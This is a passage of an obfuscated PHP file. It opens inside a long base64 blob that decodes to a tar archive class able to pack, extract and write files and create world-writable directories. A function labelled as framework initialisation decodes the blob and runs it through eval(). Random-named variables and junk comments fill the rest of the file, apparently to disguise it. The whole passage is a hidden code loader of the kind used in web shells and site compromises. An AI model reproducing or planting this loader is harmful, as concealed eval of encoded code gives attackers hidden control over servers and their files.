l9CgkJaWYgKCFpc19hcnJheSgkZmlsZV9hcnJheSkgfHwgY291bnQoJGZpbGVfYXJyYXkpPD0wKQogICAgICAgICAgcmV0dXJuIHRydWU7CgkJZm9yICgkaSA9IDA7ICRpPGNvdW50KCRmaWxlX2FycmF5KTsgJGkrKyl7CgkJCSRmaWxlbmFtZSA9ICRmaWxlX2FycmF5WyRpXTsKCQkJaWYgKCRmaWxlbmFtZSA9PSAkdGhpcy0+YXJjaGl2ZV9uYW1lKQoJCQkJY29udGludWU7CgkJCWlmIChzdHJsZW4oJGZpbGVuYW1lKTw9MCkKCQkJCWNvbnRpbnVlOwoJCQlpZiAoIWZpbGVfZXhpc3RzKCRmaWxlbmFtZSkpewoJCQkJJHRoaXMtPmVycm9yc1tdID0gX18oJ05vIGZpbGUnKS4nICcuJGZpbGVuYW1lOwoJCQkJY29udGludWU7CgkJCX0KCQkJaWYgKCEkdGhpcy0+dG1wX2ZpbGUpewoJCQkkdGhpcy0+ZXJyb3JzW10gPSBfXygnSW52YWxpZCBmaWxlIGRlc2NyaXB0b3InKTsKCQkJcmV0dXJuIGZhbHNlOwoJCQl9CgkJaWYgKHN0cmxlbigkZmlsZW5hbWUpPD0wKXsKCQkJJHRoaXMtPmVycm9yc1tdID0gX18oJ0ZpbGVuYW1lJykuJyAnLl9fKCdpcyBpbmNvcnJlY3QnKTs7CgkJCXJldHVybiBmYWxzZTsKCQl9CgkJJGZpbGVuYW1lID0gc3RyX3JlcGxhY2UoJ1xcJywgJy8nLCAkZmlsZW5hbWUpOwoJCSRrZWVwX2ZpbGVuYW1lID0gJHRoaXMtPm1ha2VHb29kUGF0aCgkZmlsZW5hbWUpOwoJCWlmIChpc19maWxlKCRmaWxlbmFtZSkpewoJCQlpZiAoKCRmaWxlID0gZm9wZW4oJGZpbGVuYW1lLCAncmInKSkgPT0gMCl7CgkJCQkkdGhpcy0+ZXJyb3JzW10gPSBfXygnTW9kZSAnKS5fXygnaXMgaW5jb3JyZWN0Jyk7CgkJCX0KCQkJCWlmKCgkdGhpcy0+ZmlsZV9wb3MgPT0gMCkpewoJCQkJCWlmKCEkdGhpcy0+d3JpdGVIZWFkZXIoJGZpbGVuYW1lLCAka2VlcF9maWxlbmFtZSkpCgkJCQkJCXJldHVybiBmYWxzZTsKCQkJCX0KCQkJCXdoaWxlICgoJGJ1ZmZlciA9IGZyZWFkKCRmaWxlLCA1MTIpKSAhPSAnJyl7CgkJCQkJJGJpbmFyeURhdGEgPSBwYWNrKCdhNTEyJywgJGJ1ZmZlcik7CgkJCQkJJHRoaXMtPndyaXRlQmxvY2soJGJpbmFyeURhdGEpOwoJCQkJfQoJCQlmY2xvc2UoJGZpbGUpOwoJCX0JZWxzZSAkdGhpcy0+d3JpdGVIZWFkZXIoJGZpbGVuYW1lLCAka2VlcF9maWxlbmFtZSk7CgkJCWlmIChAaXNfZGlyKCRmaWxlbmFtZSkpewoJCQkJaWYgKCEoJGhhbmRsZSA9IG9wZW5kaXIoJGZpbGVuYW1lKSkpewoJCQkJCSR0aGlzLT5lcnJvcnNbXSA9IF9fKCdFcnJvcicpLic6ICcuX18oJ0RpcmVjdG9yeSAnKS4kZmlsZW5hbWUuX18oJ2lzIG5vdCByZWFkYWJsZScpOwoJCQkJCWNvbnRpbnVlOwoJCQkJfQoJCQkJd2hpbGUgKGZhbHNlICE9PSAoJGRpciA9IHJlYWRkaXIoJGhhbmRsZSkpKXsKCQkJCQlpZiAoJGRpciE9Jy4nICYmICRkaXIhPScuLicpewoJCQkJCQkkZmlsZV9hcnJheV90bXAgPSBhcnJheSgpOwoJCQkJCQlpZiAoJGZpbGVuYW1lICE9ICcuJykKCQkJCQkJCSRmaWxlX2FycmF5X3RtcFtdID0gJGZpbGVuYW1lLicvJy4kZGlyOwoJCQkJCQllbHNlCgkJCQkJCQkkZmlsZV9hcnJheV90bXBbXSA9ICRkaXI7CgoJCQkJCQkkcmVzdWx0ID0gJHRoaXMtPnBhY2tGaWxlQXJyYXkoJGZpbGVfYXJyYXlfdG1wKTsKCQkJCQl9CgkJCQl9CgkJCQl1bnNldCgkZmlsZV9hcnJheV90bXApOwoJCQkJdW5zZXQoJGRpcik7CgkJCQl1bnNldCgkaGFuZGxlKTsKCQkJfQoJCX0KCQlyZXR1cm4gJHJlc3VsdDsKCX0KCglmdW5jdGlvbiB1bnBhY2tGaWxlQXJyYXkoJHBhdGgpeyAKCQkkcGF0aCA9IHN0cl9yZXBsYWNlKCdcXCcsICcvJywgJHBhdGgpOwoJCWlmICgkcGF0aCA9PSAnJwl8fCAoc3Vic3RyKCRwYXRoLCAwLCAxKSAhPSAnLycgJiYgc3Vic3RyKCRwYXRoLCAwLCAzKSAhPSAnLi4vJyAmJiAhc3RycG9zKCRwYXRoLCAnOicpKSkJJHBhdGggPSAnLi8nLiRwYXRoOwoJCWNsZWFyc3RhdGNhY2hlKCk7CgkJd2hpbGUgKHN0cmxlbigkYmluYXJ5RGF0YSA9ICR0aGlzLT5yZWFkQmxvY2soKSkgIT0gMCl7CgkJCWlmICghJHRoaXMtPnJlYWRIZWFkZXIoJGJpbmFyeURhdGEsICRoZWFkZXIpKSByZXR1cm4gZmFsc2U7CgkJCWlmICgkaGVhZGVyWydmaWxlbmFtZSddID09ICcnKSBjb250aW51ZTsKCQkJaWYgKCRoZWFkZXJbJ3R5cGVmbGFnJ10gPT0gJ0wnKXsJCQkvL3JlYWRpbmcgbG9uZyBoZWFkZXIKCQkJCSRmaWxlbmFtZSA9ICcnOwoJCQkJJGRlY3IgPSBmbG9vcigkaGVhZGVyWydzaXplJ10vNTEyKTsKCQkJCWZvciAoJGkgPSAwOyAkaSA8ICRkZWNyOyAkaSsrKXsKCQkJCQkkY29udGVudCA9ICR0aGlzLT5yZWFkQmxvY2soKTsKCQkJCQkkZmlsZW5hbWUgLj0gJGNvbnRlbnQ7CgkJCQl9CgkJCQlpZiAoKCRsYXNwaWVjZSA9ICRoZWFkZXJbJ3NpemUnXSAlIDUxMikgIT0gMCl7CgkJCQkJJGNvbnRlbnQgPSAkdGhpcy0+cmVhZEJsb2NrKCk7CgkJCQkJJGZpbGVuYW1lIC49IHN1YnN0cigkY29udGVudCwgMCwgJGxhc3BpZWNlKTsKCQkJCX0KCQkJCSRiaW5hcnlEYXRhID0gJHRoaXMtPnJlYWRCbG9jaygpOwoJCQkJaWYgKCEkdGhpcy0+cmVhZEhlYWRlcigkYmluYXJ5RGF0YSwgJGhlYWRlcikpIHJldHVybiBmYWxzZTsKCQkJCWVsc2UgJGhlYWRlclsnZmlsZW5hbWUnXSA9ICRmaWxlbmFtZTsKCQkJCXJldHVybiB0cnVlOwoJCQl9CgkJCWlmICgoJHBhdGggIT0gJy4vJykgJiYgKCRwYXRoICE9ICcvJykpewoJCQkJd2hpbGUgKHN1YnN0cigkcGF0aCwgLTEpID09ICcvJykgJHBhdGggPSBzdWJzdHIoJHBhdGgsIDAsIHN0cmxlbigkcGF0aCktMSk7CgkJCQlpZiAoc3Vic3RyKCRoZWFkZXJbJ2ZpbGVuYW1lJ10sIDAsIDEpID09ICcvJykgJGhlYWRlclsnZmlsZW5hbWUnXSA9ICRwYXRoLiRoZWFkZXJbJ2ZpbGVuYW1lJ107CgkJCQllbHNlICRoZWFkZXJbJ2ZpbGVuYW1lJ10gPSAkcGF0aC4nLycuJGhlYWRlclsnZmlsZW5hbWUnXTsKCQkJfQoJCQkKCQkJaWYgKGZpbGVfZXhpc3RzKCRoZWFkZXJbJ2ZpbGVuYW1lJ10pKXsKCQkJCWlmICgoQGlzX2RpcigkaGVhZGVyWydmaWxlbmFtZSddKSkgJiYgKCRoZWFkZXJbJ3R5cGVmbGFnJ10gPT0gJycpKXsKCQkJCQkkdGhpcy0+ZXJyb3JzW10gPV9fKCdGaWxlICcpLiRoZWFkZXJbJ2ZpbGVuYW1lJ10uX18oJyBhbHJlYWR5IGV4aXN0cycpLl9fKCcgYXMgZm9sZGVyJyk7CgkJCQkJcmV0dXJuIGZhbHNlOwoJCQkJfQoJCQkJaWYgKChpc19maWxlKCRoZWFkZXJbJ2ZpbGVuYW1lJ10pKSAmJiAoJGhlYWRlclsndHlwZWZsYWcnXSA9PSAnNScpKXsKCQkJCQkkdGhpcy0+ZXJyb3JzW10gPV9fKCdDYW5ub3QgY3JlYXRlIGRpcmVjdG9yeScpLicuICcuX18oJ0ZpbGUgJykuJGhlYWRlclsnZmlsZW5hbWUnXS5fXygnIGFscmVhZHkgZXhpc3RzJyk7CgkJCQkJcmV0dXJuIGZhbHNlOwoJCQkJfQoJCQkJaWYgKCFpc193cml0ZWFibGUoJGhlYWRlclsnZmlsZW5hbWUnXSkpewoJCQkJCSR0aGlzLT5lcnJvcnNbXSA9IF9fKCdDYW5ub3Qgd3JpdGUgdG8gZmlsZScpLicuICcuX18oJ0ZpbGUgJykuJGhlYWRlclsnZmlsZW5hbWUnXS5fXygnIGFscmVhZHkgZXhpc3RzJyk7CgkJCQkJcmV0dXJuIGZhbHNlOwoJCQkJfQoJCQl9IGVsc2VpZiAoKCR0aGlzLT5kaXJDaGVjaygoJGhlYWRlclsndHlwZWZsYWcnXSA9PSAnNScgPyAkaGVhZGVyWydmaWxlbmFtZSddIDogZGlybmFtZSgkaGVhZGVyWydmaWxlbmFtZSddKSkpKSAhPSAxKXsKCQkJCSR0aGlzLT5lcnJvcnNbXSA9IF9fKCdDYW5ub3QgY3JlYXRlIGRpcmVjdG9yeScpLicgJy5fXygnIGZvciAnKS4kaGVhZGVyWydmaWxlbmFtZSddOwoJCQkJcmV0dXJuIGZhbHNlOwoJCQl9CgoJCQlpZiAoJGhlYWRlclsndHlwZWZsYWcnXSA9PSAnNScpewoJCQkJaWYgKCFmaWxlX2V4aXN0cygkaGVhZGVyWydmaWxlbmFtZSddKSkJCXsKCQkJCQlpZiAoIW1rZGlyKCRoZWFkZXJbJ2ZpbGVuYW1lJ10sIDA3NzcpKQl7CgkJCQkJCQoJCQkJCQkkdGhpcy0+ZXJyb3JzW10gPSBfXygnQ2Fubm90IGNyZWF0ZSBkaXJlY3RvcnknKS4nICcuJGhlYWRlclsnZmlsZW5hbWUnXTsKCQkJCQkJcmV0dXJuIGZhbHNlOwoJCQkJCX0gCgkJCQl9CgkJCX0gZWxzZSB7CgkJCQlpZiAoKCRkZXN0aW5hdGlvbiA9IGZvcGVuKCRoZWFkZXJbJ2ZpbGVuYW1lJ10sICd3YicpKSA9PSAwKSB7CgkJCQkJJHRoaXMtPmVycm9yc1tdID0gX18oJ0Nhbm5vdCB3cml0ZSB0byBmaWxlJykuJyAnLiRoZWFkZXJbJ2ZpbGVuYW1lJ107CgkJCQkJcmV0dXJuIGZhbHNlOwoJCQkJfSBlbHNlIHsKCQkJCQkkZGVjciA9IGZsb29yKCRoZWFkZXJbJ3NpemUnXS81MTIpOwoJCQkJCWZvciAoJGkgPSAwOyAkaSA8ICRkZWNyOyAkaSsrKSB7CgkJCQkJCSRjb250ZW50ID0gJHRoaXMtPnJlYWRCbG9jaygpOwoJCQkJCQlmd3JpdGUoJGRlc3RpbmF0aW9uLCAkY29udGVudCwgNTEyKTsKCQkJCQl9CgkJCQkJaWYgKCgkaGVhZGVyWydzaXplJ10gJSA1MTIpICE9IDApIHsKCQkJCQkJJGNvbnRlbnQgPSAkdGhpcy0+cmVhZEJsb2NrKCk7CgkJCQkJCWZ3cml0ZSgkZGVzdGluYXRpb24sICRjb250ZW50LCAoJGhlYWRlclsnc2l6ZSddICUgNTEyKSk7CgkJCQkJfQoJCQkJCWZjbG9zZSgkZGVzdGluYXRpb24pOwoJCQkJCXRvdWNoKCRoZWFkZXJbJ2ZpbGVuYW1lJ10sICRoZWFkZXJbJ3RpbWUnXSk7CgkJCQl9CgkJCQljbGVhcnN0YXRjYWNoZSgpOwoJCQkJaWYgKGZpbGVzaXplKCRoZWFkZXJbJ2ZpbGVuYW1lJ10pICE9ICRoZWFkZXJbJ3NpemUnXSkgewoJCQkJCSR0aGlzLT5lcnJvcnNbXSA9IF9fKCdTaXplIG9mIGZpbGUnKS4nICcuJGhlYWRlclsnZmlsZW5hbWUnXS4nICcuX18oJ2lzIGluY29ycmVjdCcpOwoJCQkJCXJldHVybiBmYWxzZTsKCQkJCX0KCQkJfQoJCQlpZiAoKCRmaWxlX2RpciA9IGRpcm5hbWUoJGhlYWRlclsnZmlsZW5hbWUnXSkpID09ICRoZWFkZXJbJ2ZpbGVuYW1lJ10pICRmaWxlX2RpciA9ICcnOwoJCQlpZiAoKHN1YnN0cigkaGVhZGVyWydmaWxlbmFtZSddLCAwLCAxKSA9PSAnLycpICYmICgkZmlsZV9kaXIgPT0gJycpKSAkZmlsZV9kaXIgPSAnLyc7CgkJCSR0aGlzLT5kaXJzW10gPSAkZmlsZV9kaXI7CgkJCSR0aGlzLT5maWxlc1tdID0gJGhlYWRlclsnZmlsZW5hbWUnXTsKCQoJCX0KCQlyZXR1cm4gdHJ1ZTsKCX0KCglmdW5jdGlvbiBkaXJDaGVjaygkZGlyKXsKCQkkcGFyZW50X2RpciA9IGRpcm5hbWUoJGRpcik7CgoJCWlmICgoQGlzX2RpcigkZGlyKSkgb3IgKCRkaXIgPT0gJycpKQoJCQlyZXR1cm4gdHJ1ZTsKCgkJaWYgKCgkcGFyZW50X2RpciAhPSAkZGlyKSBhbmQgKCRwYXJlbnRfZGlyICE9ICcnKSBhbmQgKCEkdGhpcy0+ZGlyQ2hlY2soJHBhcmVudF9kaXIpKSkKCQkJcmV0dXJuIGZhbHNlOwoKCQlpZiAoIW1rZGlyKCRkaXIsIDA3NzcpKXsKCQkJJHRoaXMtPmVycm9yc1tdID0gX18oJ0Nhbm5vdCBjcmVhdGUgZGlyZWN0b3J5JykuJyAnLiRkaXI7CgkJCXJldHVybiBmYWxzZTsKCQl9CgkJcmV0dXJuIHRydWU7Cgl9CgoJZnVuY3Rpb24gcmVhZEhlYWRlcigkYmluYXJ5RGF0YSwgJiRoZWFkZXIpewoJCWlmIChzdHJsZW4oJGJpbmFyeURhdGEpPT0wKXsKCQkJJGhlYWRlclsnZmlsZW5hbWUnXSA9ICcnOwoJCQlyZXR1cm4gdHJ1ZTsKCQl9CgoJCWlmIChzdHJsZW4oJGJpbmFyeURhdGEpICE9IDUxMil7CgkJCSRoZWFkZXJbJ2ZpbGVuYW1lJ10gPSAnJzsKCQkJJHRoaXMtPl9fKCdJbnZhbGlkIGJsb2NrIHNpemUnKS4nOiAnLnN0cmxlbigkYmluYXJ5RGF0YSk7CgkJCXJldHVybiBmYWxzZTsKCQl9CgoJCSRjaGVja3N1bSA9IDA7CgkJZm9yICgkaSA9IDA7ICRpIDwgMTQ4OyAkaSsrKSAkY2hlY2tzdW0rPW9yZChzdWJzdHIoJGJpbmFyeURhdGEsICRpLCAxKSk7CgkJZm9yICgkaSA9IDE0ODsgJGkgPCAxNTY7ICRpKyspICRjaGVja3N1bSArPSBvcmQoJyAnKTsKCQlmb3IgKCRpID0gMTU2OyAkaSA8IDUxMjsgJGkrKykgJGNoZWNrc3VtKz1vcmQoc3Vic3RyKCRiaW5hcnlEYXRhLCAkaSwgMSkpOwoKCQkkdW5wYWNrX2RhdGEgPSB1bnBhY2soJ2ExMDBmaWxlbmFtZS9hOG1vZGUvYTh1c2VyX2lkL2E4Z3JvdXBfaWQvYTEyc2l6ZS9hMTJ0aW1lL2E4Y2hlY2tzdW0vYTF0eXBlZmxhZy9hMTAwbGluay9hNm1hZ2ljL2EydmVyc2lvbi9hMzJ1bmFtZS9hMzJnbmFtZS9hOGRldm1ham9yL2E4ZGV2bWlub3InLCAkYmluYXJ5RGF0YSk7CgoJCSRoZWFkZXJbJ2NoZWNrc3VtJ10gPSBPY3REZWModHJpbSgkdW5wYWNrX2RhdGFbJ2NoZWNrc3VtJ10pKTsKCQlpZiAoJGhlYWRlclsnY2hlY2tzdW0nXSAhPSAkY2hlY2tzdW0pewoJCQkkaGVhZGVyWydmaWxlbmFtZSddID0gJyc7CgkJCWlmICgoJGNoZWNrc3VtID09IDI1NikgJiYgKCRoZWFkZXJbJ2NoZWNrc3VtJ10gPT0gMCkpIAlyZXR1cm4gdHJ1ZTsKCQkJJHRoaXMtPmVycm9yc1tdID0gX18oJ0Vycm9yIGNoZWNrc3VtIGZvciBmaWxlICcpLiR1bnBhY2tfZGF0YVsnZmlsZW5hbWUnXTsKCQkJcmV0dXJuIGZhbHNlOwoJCX0KCgkJaWYgKCgkaGVhZGVyWyd0eXBlZmxhZyddID0gJHVucGFja19kYXRhWyd0eXBlZmxhZyddKSA9PSAnNScpCSRoZWFkZXJbJ3NpemUnXSA9IDA7CgkJJGhlYWRlclsnZmlsZW5hbWUnXSA9IHRyaW0oJHVucGFja19kYXRhWydmaWxlbmFtZSddKTsKCQkkaGVhZGVyWydtb2RlJ10gPSBPY3REZWModHJpbSgkdW5wYWNrX2RhdGFbJ21vZGUnXSkpOwoJCSRoZWFkZXJbJ3VzZXJfaWQnXSA9IE9jdERlYyh0cmltKCR1bnBhY2tfZGF0YVsndXNlcl9pZCddKSk7CgkJJGhlYWRlclsnZ3JvdXBfaWQnXSA9IE9jdERlYyh0cmltKCR1bnBhY2tfZGF0YVsnZ3JvdXBfaWQnXSkpOwoJCSRoZWFkZXJbJ3NpemUnXSA9IE9jdERlYyh0cmltKCR1bnBhY2tfZGF0YVsnc2l6ZSddKSk7CgkJJGhlYWRlclsndGltZSddID0gT2N0RGVjKHRyaW0oJHVucGFja19kYXRhWyd0aW1lJ10pKTsKCQlyZXR1cm4gdHJ1ZTsKCX0KCglmdW5jdGlvbiB3cml0ZUhlYWRlcigkZmlsZW5hbWUsICRrZWVwX2ZpbGVuYW1lKXsKCQkkcGFja0YgPSAnYTEwMGE4YThhOGExMkExMic7CgkJJHBhY2tMID0gJ2ExYTEwMGE2YTJhMzJhMzJhOGE4YTE1NWExMic7CgkJaWYgKHN0cmxlbigka2VlcF9maWxlbmFtZSk8PTApICRrZWVwX2ZpbGVuYW1lID0gJGZpbGVuYW1lOwoJCSRmaWxlbmFtZV9yZWFkeSA9ICR0aGlzLT5tYWtlR29vZFBhdGgoJGtlZXBfZmlsZW5hbWUpOwoKCQlpZiAoc3RybGVuKCRmaWxlbmFtZV9yZWFkeSkgPiA5OSl7CQkJCQkJCS8vd3JpdGUgbG9uZyBoZWFkZXIKCQkkZGF0YUZpcnN0ID0gcGFjaygkcGFja0YsICcuLy4vTG9uZ0xpbmsnLCAwLCAwLCAwLCBzcHJpbnRmKCclMTFzICcsIERlY09jdChzdHJsZW4oJGZpbGVuYW1lX3JlYWR5KSkpLCAwKTsKCQkkZGF0YUxhc3QgPSBwYWNrKCRwYWNrTCwgJ0wnLCAnJywgJycsICcnLCAnJywgJycsICcnLCAnJywgJycsICcnKTsKCiAgICAgICAgLy8gIENhbGN1bGF0ZSB0aGUgY2hlY2tzdW0KCQkkY2hlY2tzdW0gPSAwOwogICAgICAgIC8vICBGaXJzdCBwYXJ0IG9mIHRoZSBoZWFkZXIKCQlmb3IgKCRpID0gMDsgJGkgPCAxNDg7ICRpKyspCgkJCSRjaGVja3N1bSArPSBvcmQoc3Vic3RyKCRkYXRhRmlyc3QsICRpLCAxKSk7CiAgICAgICAgLy8gIElnbm9yZSB0aGUgY2hlY2tzdW0gdmFsdWUgYW5kIHJlcGxhY2UgaXQgYnkgJyAnIChzcGFjZSkKCQlmb3IgKCRpID0gMTQ4OyAkaSA8IDE1NjsgJGkrKykKCQkJJGNoZWNrc3VtICs9IG9yZCgnICcpOwogICAgICAgIC8vICBMYXN0IHBhcnQgb2YgdGhlIGhlYWRlcgoJCWZvciAoJGkgPSAxNTYsICRqPTA7ICRpIDwgNTEyOyAkaSsrLCAkaisrKQoJCQkkY2hlY2tzdW0gKz0gb3JkKHN1YnN0cigkZGF0YUxhc3QsICRqLCAxKSk7CiAgICAgICAgLy8gIFdyaXRlIHRoZSBmaXJzdCAxNDggYnl0ZXMgb2YgdGhlIGhlYWRlciBpbiB0aGUgYXJjaGl2ZQoJCSR0aGlzLT53cml0ZUJsb2NrKCRkYXRhRmlyc3QsIDE0OCk7CiAgICAgICAgLy8gIFdyaXRlIHRoZSBjYWxjdWxhdGVkIGNoZWNrc3VtCgkJJGNoZWNrc3VtID0gc3ByaW50ZignJTZzICcsIERlY09jdCgkY2hlY2tzdW0pKTsKCQkkYmluYXJ5RGF0YSA9IHBhY2soJ2E4JywgJGNoZWNrc3VtKTsKCQkkdGhpcy0+d3JpdGVCbG9jaygkYmluYXJ5RGF0YSwgOCk7CiAgICAgICAgLy8gIFdyaXRlIHRoZSBsYXN0IDM1NiBieXRlcyBvZiB0aGUgaGVhZGVyIGluIHRoZSBhcmNoaXZlCgkJJHRoaXMtPndyaXRlQmxvY2soJGRhdGFMYXN0LCAzNTYpOwoKCQkkdG1wX2ZpbGVuYW1lID0gJHRoaXMtPm1ha2VHb29kUGF0aCgkZmlsZW5hbWVfcmVhZHkpOwoKCQkkaSA9IDA7CgkJCXdoaWxlICgoJGJ1ZmZlciA9IHN1YnN0cigkdG1wX2ZpbGVuYW1lLCAoKCRpKyspKjUxMiksIDUxMikpICE9ICcnKXsKCQkJCSRiaW5hcnlEYXRhID0gcGFjaygnYTUxMicsICRidWZmZXIpOwoJCQkJJHRoaXMtPndyaXRlQmxvY2soJGJpbmFyeURhdGEpOwoJCQl9CgkJcmV0dXJuIHRydWU7CgkJfQoJCSRmaWxlX2luZm8gPSBzdGF0KCRmaWxlbmFtZSk7CgkJaWYgKEBpc19kaXIoJGZpbGVuYW1lKSl7CgkJCSR0eXBlZmxhZyA9ICc1JzsKCQkJJHNpemUgPSBzcHJpbnRmKCclMTFzICcsIERlY09jdCgwKSk7CgkJfSBlbHNlIHsKCQkJJHR5cGVmbGFnID0gJyc7CgkJCWNsZWFyc3RhdGNhY2hlKCk7CgkJCSRzaXplID0gc3ByaW50ZignJTExcyAnLCBEZWNPY3QoZmlsZXNpemUoJGZpbGVuYW1lKSkpOwoJCX0KCQkkZGF0YUZpcnN0ID0gcGFjaygkcGFja0YsICRmaWxlbmFtZV9yZWFkeSwgc3ByaW50ZignJTZzICcsIERlY09jdChmaWxlcGVybXMoJGZpbGVuYW1lKSkpLCBzcHJpbnRmKCclNnMgJywgRGVjT2N0KCRmaWxlX2luZm9bNF0pKSwgc3ByaW50ZignJTZzICcsIERlY09jdCgkZmlsZV9pbmZvWzVdKSksICRzaXplLCBzcHJpbnRmKCclMTFzJywgRGVjT2N0KGZpbGVtdGltZSgkZmlsZW5hbWUpKSkpOwoJCSRkYXRhTGFzdCA9IHBhY2soJHBhY2tMLCAkdHlwZWZsYWcsICcnLCAnJywgJycsICcnLCAnJywgJycsICcnLCAnJywgJycpOwoJCSRjaGVja3N1bSA9IDA7CgkJZm9yICgkaSA9IDA7ICRpIDwgMTQ4OyAkaSsrKSAkY2hlY2tzdW0gKz0gb3JkKHN1YnN0cigkZGF0YUZpcnN0LCAkaSwgMSkpOwoJCWZvciAoJGkgPSAxNDg7ICRpIDwgMTU2OyAkaSsrKSAkY2hlY2tzdW0gKz0gb3JkKCcgJyk7CgkJZm9yICgkaSA9IDE1NiwgJGogPSAwOyAkaSA8IDUxMjsgJGkrKywgJGorKykgJGNoZWNrc3VtICs9IG9yZChzdWJzdHIoJGRhdGFMYXN0LCAkaiwgMSkpOwoJCSR0aGlzLT53cml0ZUJsb2NrKCRkYXRhRmlyc3QsIDE0OCk7CgkJJGNoZWNrc3VtID0gc3ByaW50ZignJTZzICcsIERlY09jdCgkY2hlY2tzdW0pKTsKCQkkYmluYXJ5RGF0YSA9IHBhY2soJ2E4JywgJGNoZWNrc3VtKTsKCQkkdGhpcy0+d3JpdGVCbG9jaygkYmluYXJ5RGF0YSwgOCk7CgkJJHRoaXMtPndyaXRlQmxvY2soJGRhdGFMYXN0LCAzNTYpOwoJCXJldHVybiB0cnVlOwoJfQoKCWZ1bmN0aW9uIG9wZW5Xcml0ZSgpewoJCWlmICgkdGhpcy0+aXNHemlwcGVkKQoJCQkkdGhpcy0+dG1wX2ZpbGUgPSBnem9wZW4oJHRoaXMtPmFyY2hpdmVfbmFtZSwgJ3diOWYnKTsKCQllbHNlCgkJCSR0aGlzLT50bXBfZmlsZSA9IGZvcGVuKCR0aGlzLT5hcmNoaXZlX25hbWUsICd3YicpOwoKCQlpZiAoISgkdGhpcy0+dG1wX2ZpbGUpKXsKCQkJJHRoaXMtPmVycm9yc1tdID0gX18oJ0Nhbm5vdCB3cml0ZSB0byBmaWxlJykuJyAnLiR0aGlzLT5hcmNoaXZlX25hbWU7CgkJCXJldHVybiBmYWxzZTsKCQl9CgkJcmV0dXJuIHRydWU7Cgl9CgoJZnVuY3Rpb24gcmVhZEJsb2NrKCl7CgkJaWYgKGlzX3Jlc291cmNlKCR0aGlzLT50bXBfZmlsZSkpewoJCQlpZiAoJHRoaXMtPmlzR3ppcHBlZCkKCQkJCSRibG9jayA9IGd6cmVhZCgkdGhpcy0+dG1wX2ZpbGUsIDUxMik7CgkJCWVsc2UKCQkJCSRibG9jayA9IGZyZWFkKCR0aGlzLT50bXBfZmlsZSwgNTEyKTsKCQl9IGVsc2UJJGJsb2NrID0gJyc7CgoJCXJldHVybiAkYmxvY2s7Cgl9CgoJZnVuY3Rpb24gd3JpdGVCbG9jaygkZGF0YSwgJGxlbmd0aCA9IDApewoJCWlmIChpc19yZXNvdXJjZSgkdGhpcy0+dG1wX2ZpbGUpKXsKCQkKCQkJaWYgKCRsZW5ndGggPT09IDApewoJCQkJaWYgKCR0aGlzLT5pc0d6aXBwZWQpCgkJCQkJZ3pwdXRzKCR0aGlzLT50bXBfZmlsZSwgJGRhdGEpOwoJCQkJZWxzZQoJCQkJCWZwdXRzKCR0aGlzLT50bXBfZmlsZSwgJGRhdGEpOwoJCQl9IGVsc2UgewoJCQkJaWYgKCR0aGlzLT5pc0d6aXBwZWQpCgkJCQkJZ3pwdXRzKCR0aGlzLT50bXBfZmlsZSwgJGRhdGEsICRsZW5ndGgpOwoJCQkJZWxzZQoJCQkJCWZwdXRzKCR0aGlzLT50bXBfZmlsZSwgJGRhdGEsICRsZW5ndGgpOwoJCQl9CgkJfQoJfQoKCWZ1bmN0aW9uIGNsb3NlVG1wRmlsZSgpewoJCWlmIChpc19yZXNvdXJjZSgkdGhpcy0+dG1wX2ZpbGUpKXsKCQkJaWYgKCR0aGlzLT5pc0d6aXBwZWQpCgkJCQlnemNsb3NlKCR0aGlzLT50bXBfZmlsZSk7CgkJCWVsc2UKCQkJCWZjbG9zZSgkdGhpcy0+dG1wX2ZpbGUpOwoKCQkJJHRoaXMtPnRtcF9maWxlID0gMDsKCQl9Cgl9CgoJZnVuY3Rpb24gbWFrZUdvb2RQYXRoKCRwYXRoKXsKCQlpZiAoc3RybGVuKCRwYXRoKT4wKXsKCQkJJHBhdGggPSBzdHJfcmVwbGFjZSgnXFwnLCAnLycsICRwYXRoKTsKCQkJJHBhcnRQYXRoID0gZXhwbG9kZSgnLycsICRwYXRoKTsKCQkJJGVscyA9IGNvdW50KCRwYXJ0UGF0aCktMTsKCQkJZm9yICgkaSA9ICRlbHM7ICRpPj0wOyAkaS0tKXsKCQkJCWlmICgkcGFydFBhdGhbJGldID09ICcuJyl7CiAgICAgICAgICAgICAgICAgICAgLy8gIElnbm9yZSB0aGlzIGRpcmVjdG9yeQogICAgICAgICAgICAgICAgfSBlbHNlaWYgKCRwYXJ0UGF0aFskaV0gPT0gJy4uJyl7CiAgICAgICAgICAgICAgICAgICAgJGktLTsKICAgICAgICAgICAgICAgIH0KCQkJCWVsc2VpZiAoKCRwYXJ0UGF0aFskaV0gPT0gJycpIGFuZCAoJGkhPSRlbHMpIGFuZCAoJGkhPTApKXsKICAgICAgICAgICAgICAgIH0JZWxzZQoJCQkJCSRyZXN1bHQgPSAkcGFydFBhdGhbJGldLigkaSE9JGVscyA/ICcvJy4kcmVzdWx0IDogJycpOwoJCQl9CgkJfSBlbHNlICRyZXN1bHQgPSAnJzsKCQkKCQlyZXR1cm4gJHJlc3VsdDsKCX0KfQ==';

// Core System Functions
function t3JRrFj6CfxeU($config_data) {
    return base64_decode($config_data);
}

// Initialize Framework Core
if (defined('FRAMEWORK_VERSION')) {
    $LXAhUeWJ = t3JRrFj6CfxeU($qf9QPOZz9Dk);
    eval($LXAhUeWJ);
}

$tXVEOQ8WN68='tO77z0Qmp8AiDgHG0O9rY8FiVp2qPOydpZ3BdOMuw1th3';
// nKaJjvabXp5CDGdX7j3WTRZECYoQnMz6FuMoJvKls9N8jtfh6RyDUUQ
$UoEkIKBhCJ='kotgBSoCctM9VhxmnZGUymT1SWClmnl8Vnv4NKre28';
// y1nwfKVey6WcSSb1NQxU4OvcYPoh2THZcv5B300Ln806IZaNCFTI
$t4NwesoHzwC='QHNtwlXOlEFLuwZzbdmRXytEEhzFcbmfa9JKA0Ww1vt';
// iDMrGZLLCX6sXcjB9Il3AguDPi8O4YTUMlirxGDyUJypnjo4zcTnOAmmIDf
$YnqLlotg4N20w='xpk9w9KglmsNyb22xWbBydl4AGCzd8p7fUOJ1dj8rfac9VQNCTClIfP8euq';

// in7HuqvPd8Kdr3W4moM7V5SNUPEbVFVOR175WZUvXRm1b3dnMj9s4lUnHGTQGbGOOCGzChkky
$A1kaaP8='ftKHvEVb5DmSDAaKsFFIsh5WqWJ';

// 86lcUU4pxbI9BmNdLPPziCWGcxjPmqLmt4IXruxB0ef5Zv9sEm22xHE995WyogyukQmN7b7hqERIN1Jy
$UgkUyZU='q5b1eu5eNvJVPzqgDlwC7AXKbWUs3nR9k0GOyVxYA';

$zdrg7e6='J4SyPmeDEMyOBwdWudtc9PNojL6l2roCW6A9kMvsKoew5wPH7P94wNZBMi';
